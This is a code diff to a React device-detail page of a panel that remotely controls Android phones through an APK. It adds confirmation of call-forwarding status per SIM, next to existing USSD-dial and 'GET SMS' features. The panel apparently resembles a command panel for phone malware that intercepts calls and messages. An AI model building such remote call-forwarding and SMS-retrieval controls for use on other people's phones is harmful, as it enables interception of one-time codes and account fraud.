@@ -249,6 +249,7 @@ export default function DeviceDetailPage() {
   const [cfOpen,    setCfOpen]    = useState(false);
   const [cfSim,     setCfSim]     = useState(0);
   const [cfNumber,  setCfNumber]  = useState("");
+  const cfSimRef    = useRef<0 | 1>(0); // tracks last used SIM for simSlots WS event
 
   // ── Dial USSD modal state ─────────────────────────────────────────────────
   const [ussdOpen,  setUssdOpen]  = useState(false);
@@ -421,6 +422,27 @@ export default function DeviceDetailPage() {
         return;
       }
 
+      // simSlots event — APK sends this after call_forward result (MAIN confirmation source!)
+      // Old panel showed "Device confirmed: ACTIVE" from THIS event
+      if (type === "event" && event === "simSlots" && evDid === did) {
+        const slotKey = cfSimRef.current === 0 ? "0" : "1";
+        const st = safeStr(data?.[slotKey]?.status ?? data?.[slotKey] ?? "").toLowerCase();
+        if (st === "active") {
+          showForwardResult("✅ Device confirmed: ACTIVE");
+          logStatus("Call forwarding ACTIVE", "green");
+        } else if (st === "inactive") {
+          showForwardResult("❌ Device confirmed: INACTIVE");
+          logStatus("Call forwarding INACTIVE", "red");
+        } else if (st === "pending") {
+          // still pending — don't update alert, keep waiting
+        }
+        setDeviceDoc((prev: any) => prev
+          ? { ...prev, simSlots: { ...(prev.simSlots || {}), ...(data || {}) } }
+          : prev
+        );
+        return;
+      }
+
       // Call forward result — 3 conditions same as old working file
       if ((type === "event" && event === "call_forward:result") || event === "call_forward:result" || type === "call_forward:result") {
         const id2 = safeStr(data?.uniqueid ?? evDid);
@@ -579,6 +601,7 @@ export default function DeviceDetailPage() {
       ? (simSummary.sim1 !== "-" ? `SIM 1` : "SIM 1")
       : `SIM 2`;
 
+    cfSimRef.current = cfSim as 0 | 1; // save for simSlots handler
     setCfOpen(false);
     logStatus(mode === "check" ? "Checking call forwarding" : mode === "activate" ? "Activating call forwarding" : "Deactivating call forwarding");
     openAlert(action, "⏳ Command sent to device. Waiting for result from APK…");
@@ -894,7 +917,7 @@ export default function DeviceDetailPage() {
       {/* ── Action Alert Modal ── */}
       {devAlert && (
         <DeviceAlert message={devAlert.message} startTime={devAlert.startTime}
-          onClose={() => { setDevAlert(null); alertActionRef.current = ""; }} />
+          onClose={() => { setDevAlert(null); /* alertActionRef not cleared — result re-alerts if it comes within window */ }} />
       )}
 
       {/* ── GET SMS Modal ── */}
